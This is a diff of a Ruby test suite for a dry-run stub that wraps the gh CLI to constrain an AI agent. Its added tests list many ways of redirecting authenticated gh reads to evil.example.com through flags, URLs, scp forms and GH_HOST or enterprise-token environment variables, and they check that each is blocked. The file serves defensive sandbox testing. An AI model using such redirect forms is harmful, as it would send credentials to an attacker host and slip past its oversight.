@@ -219,16 +219,66 @@ class BabysitterDryRunEnvTest < Minitest::Test
       assert_stubbed env, "gh", "auth", "status", "-at"
       assert_stubbed env, "gh", "auth", "status", "-ta"
       assert_stubbed env, "gh", "auth", "status", "-ath"
+      # A host selector lets an agent redirect the authenticated status probe to an
+      # arbitrary host, so every `-h`/`--hostname` form is skipped: long, glued, and
+      # clustered behind boolean shorthands (where pflag consumes the rest as the value).
+      assert_stubbed env, "gh", "auth", "status", "-h", "github.com"
+      assert_stubbed env, "gh", "auth", "status", "-hgithub.com"
+      assert_stubbed env, "gh", "auth", "status", "--hostname", "example.com"
+      assert_stubbed env, "gh", "auth", "status", "--hostname=example.com"
+      assert_stubbed env, "gh", "auth", "status", "-ah", "example.com"
+      # Host-qualified `--repo`/`-R` redirect an allowlisted read at an agent-chosen host
+      # (leading or trailing the subcommand); only the bare `OWNER/REPO` slug stays allowed.
+      assert_stubbed env, "gh", "-R", "evil.example.com/owner/repo", "pr", "view", "42"
+      assert_stubbed env, "gh", "--repo=evil.example.com/owner/repo", "pr", "view", "42"
+      assert_stubbed env, "gh", "--repo=https://evil.example.com/owner/repo", "pr", "view", "42"
+      assert_stubbed env, "gh", "pr", "view", "42", "-R", "evil.example.com/owner/repo"
+      assert_stubbed env, "gh", "pr", "view", "42", "--repo", "evil.example.com/owner/repo"
+      # Glued short `-R<val>` / `-R=<val>` (pflag strips the `=`) carry a host the same way
+      # the separate and long forms do, so a host-qualified glued form trailing the subcommand
+      # — where stripped_global_options leaves it for host_override? to catch — must skip too.
+      # (Host strings are kept "w"-free so the skip is host_override?, not the external-launcher
+      # `-w` heuristic.)
+      assert_stubbed env, "gh", "pr", "view", "42", "-Revil.example.com/octo/repo"
+      assert_stubbed env, "gh", "pr", "view", "42", "-R=evil.example.com/octo/repo"
+      assert_stubbed env, "gh", "pr", "view", "42", "-Rhttps://evil.example.com/octo/repo"
+      # `gh api`/`auth` honor `--hostname` after the subcommand too, so the gate must
+      # reject command-position host overrides, not just leading globals.
+      assert_stubbed env, "gh", "api", "rate_limit", "--hostname", "evil.example.com"
+      assert_stubbed env, "gh", "api", "rate_limit", "--hostname=evil.example.com"
+      # An scp-style `git@host:owner/repo` carries a host through a single-slash
+      # `--repo`/`-R` value, so the colon (not just `://` or the slash count) must
+      # disqualify it.
+      assert_stubbed env, "gh", "-R", "git@evil.example.com:owner/repo", "pr", "view", "42"
+      # Read-only subcommands also accept the target as a positional operand — a
+      # host-qualified `HOST/OWNER/REPO` slug, a full URL, or an scp form — which the
+      # `-R`/`--repo`/`--hostname` flag gate never inspects. Each must skip.
+      assert_stubbed env, "gh", "repo", "view", "evil.example.com/owner/repo"
+      assert_stubbed env, "gh", "repo", "view", "https://evil.example.com/owner/repo"
+      assert_stubbed env, "gh", "repo", "view", "git@evil.example.com:owner/repo"
+      assert_stubbed env, "gh", "pr", "view", "https://evil.example.com/owner/repo/pull/42"
+      assert_stubbed env, "gh", "pr", "diff", "https://evil.example.com/owner/repo/pull/42"
+      assert_stubbed env, "gh", "pr", "checks", "https://evil.example.com/owner/repo/pull/42"
+      # The bare `OWNER/REPO` slug stays on the default host, so a glued short `-R<slug>`
+      # must still reach real gh — the new glued branch must not over-block the safe form.
+      # Leading: stripped_global_options shifts off the glued global; trailing: host_override?
+      # clears it directly. (`octo/repo` is "w"-free so the external-launcher `-w` heuristic
+      # stays out of the trailing case.)
+      assert_passes env, "gh", "-Rowner/repo", "pr", "view", "42"
+      assert_passes env, "gh", "pr", "view", "42", "-Rocto/repo"
       assert_passes env, "gh", "--repo=owner/repo", "pr", "view", "42"
       assert_passes env, "gh", "auth", "status"
       assert_passes env, "gh", "auth", "status", "-a"
-      # `-h`/`--hostname` consumes the rest of the cluster as its value, so a
-      # `t` that follows it is hostname data, not a token flag.
-      assert_passes env, "gh", "auth", "status", "-h", "github.com"
-      assert_passes env, "gh", "auth", "status", "-hgithub.com"
       assert_passes env, "gh", "api", "repos/owner/repo"
       assert_passes env, "gh", "api", "--method", "GET", "repos/owner/repo/issues", "-f", "state=open"
       assert_passes env, "gh", "api", "--method", "GET", "repos/owner/repo/issues", "-F", "state=open"
+      # The safe positional forms must still reach real gh, so the new positional
+      # gate does not over-block: a bare `OWNER/REPO` slug (one slash) on `repo view`,
+      # a numeric operand on `pr view`, and a slash-bearing branch ref the pr-URL rule
+      # must not mistake for a host (only a `scheme://` URL names a host for pr reads).
+      assert_passes env, "gh", "repo", "view", "owner/repo"
+      assert_passes env, "gh", "pr", "view", "42"
+      assert_passes env, "gh", "pr", "view", "feature/topic/branch"
 
       # Glued/inline @file payload forms must be caught on explicit GET too,
       # not just the space-separated `-F q=@secret` form: each branch
@@ -420,6 +470,28 @@ class BabysitterDryRunEnvTest < Minitest::Test
       assert_includes skipped, "gh auth status -at skipped"
       assert_includes skipped, "gh auth status -ta skipped"
       assert_includes skipped, "gh auth status -ath skipped"
+      assert_includes skipped, "gh auth status -h github.com skipped"
+      assert_includes skipped, "gh auth status -hgithub.com skipped"
+      assert_includes skipped, "gh auth status --hostname example.com skipped"
+      assert_includes skipped, "gh auth status --hostname=example.com skipped"
+      assert_includes skipped, "gh auth status -ah example.com skipped"
+      assert_includes skipped, "gh -R evil.example.com/owner/repo pr view 42 skipped"
+      assert_includes skipped, "gh --repo=evil.example.com/owner/repo pr view 42 skipped"
+      assert_includes skipped, "gh --repo=https://evil.example.com/owner/repo pr view 42 skipped"
+      assert_includes skipped, "gh pr view 42 -R evil.example.com/owner/repo skipped"
+      assert_includes skipped, "gh pr view 42 --repo evil.example.com/owner/repo skipped"
+      assert_includes skipped, "gh pr view 42 -Revil.example.com/octo/repo skipped"
+      assert_includes skipped, "gh pr view 42 -R=evil.example.com/octo/repo skipped"
+      assert_includes skipped, "gh pr view 42 -Rhttps://evil.example.com/octo/repo skipped"
+      assert_includes skipped, "gh api rate_limit --hostname evil.example.com skipped"
+      assert_includes skipped, "gh api rate_limit --hostname=evil.example.com skipped"
+      assert_includes skipped, "gh -R git@evil.example.com:owner/repo pr view 42 skipped"
+      assert_includes skipped, "gh repo view evil.example.com/owner/repo skipped"
+      assert_includes skipped, "gh repo view https://evil.example.com/owner/repo skipped"
+      assert_includes skipped, "gh repo view git@evil.example.com:owner/repo skipped"
+      assert_includes skipped, "gh pr view https://evil.example.com/owner/repo/pull/42 skipped"
+      assert_includes skipped, "gh pr diff https://evil.example.com/owner/repo/pull/42 skipped"
+      assert_includes skipped, "gh pr checks https://evil.example.com/owner/repo/pull/42 skipped"
       assert_includes skipped, "git -C #{dir} push origin HEAD:feature skipped"
       assert_includes skipped, "git commit -m dry run must not commit skipped"
       assert_includes skipped, "git merge feature skipped"
@@ -444,6 +516,9 @@ class BabysitterDryRunEnvTest < Minitest::Test
       assert_includes real_invocations, "real-gh --repo=owner/repo pr view 42"
       assert_includes real_invocations, "real-gh auth status"
       assert_includes real_invocations, "real-gh api repos/owner/repo"
+      assert_includes real_invocations, "real-gh repo view owner/repo"
+      assert_includes real_invocations, "real-gh pr view 42"
+      assert_includes real_invocations, "real-gh pr view feature/topic/branch"
       assert_includes real_invocations, "real-gh api --method GET repos/owner/repo/issues -f state=open"
       assert_includes real_invocations, "real-gh api --method GET repos/owner/repo/issues -F state=open"
       assert_includes real_invocations, expected_real_invocation("git", "-C", dir, "status", "--short")
@@ -511,6 +586,30 @@ class BabysitterDryRunEnvTest < Minitest::Test
     end
   end
 
+  def test_gh_stub_scrubs_host_repo_and_enterprise_token_environment_before_passthrough
+    with_tmp_dir do |dir|
+      # The argv gate inspects argv only; gh also reads the target host/repo and enterprise
+      # credentials from the environment, so an agent could set GH_HOST=evil (with a matching
+      # GH_ENTERPRISE_TOKEN) to redirect an otherwise-allowlisted read. The stub must scrub
+      # these before exec so the real gh sees them unset.
+      env_keys = %w[GH_HOST GH_REPO GH_ENTERPRISE_TOKEN GITHUB_ENTERPRISE_TOKEN]
+      real_gh = recording_env_binary(dir, "real-gh", env_keys)
+      env = {
+        "HIVE_BABYSITTER_REAL_GH" => real_gh,
+        "HIVE_BABYSITTER_DRY_RUN_LOG" => File.join(dir, "skipped.log"),
+        "GH_HOST" => "evil.example.com",
+        "GH_REPO" => "evil.example.com/owner/repo",
+        "GH_ENTERPRISE_TOKEN" => "enterprise-secret",
+        "GITHUB_ENTERPRISE_TOKEN" => "github-enterprise-secret"
+      }
+
+      _out, err, status = Open3.capture3(env, stub_path("gh"), "api", "rate_limit")
+
+      assert status.success?, err
+      assert_equal env_keys.map { |key| "#{key}=<unset>" }.join("\n") + "\n", File.read(File.join(dir, "env.log"))
+    end
+  end
+
   def test_gh_api_cache_flags_are_skipped_without_writing_cache
     with_tmp_dir do |dir|
       cache_dir = File.join(dir, "cache")
@@ -555,6 +654,29 @@ class BabysitterDryRunEnvTest < Minitest::Test
       assert_stubbed env, "gh", "pr", "view", "42", "-cw"
 
       refute File.exist?(File.join(dir, "real.log"))
+    end
+  end
+
+  def test_gh_stub_skips_leading_hostname_overrides
+    with_tmp_dir do |dir|
+      real_gh = recording_binary(dir, "real-gh")
+      log_path = File.join(dir, "skipped.log")
+      @real_log = File.join(dir, "real.log")
+      env = {
+        "HIVE_BABYSITTER_REAL_GH" => real_gh,
+        "HIVE_BABYSITTER_DRY_RUN_LOG" => log_path
+      }
+
+      assert_stubbed env, "gh", "--hostname", "example.com", "api", "rate_limit"
+      assert_stubbed env, "gh", "--hostname=example.com", "api", "rate_limit"
+      assert_stubbed env, "gh", "--hostname", "example.com", "auth", "status"
+      assert_stubbed env, "gh", "--hostname=example.com", "auth", "status"
+
+      skipped = File.read(log_path)
+      assert_includes skipped, "gh --hostname example.com api rate_limit skipped"
+      assert_includes skipped, "gh --hostname=example.com api rate_limit skipped"
+      assert_includes skipped, "gh --hostname example.com auth status skipped"
+      assert_includes skipped, "gh --hostname=example.com auth status skipped"
     end
   end
 
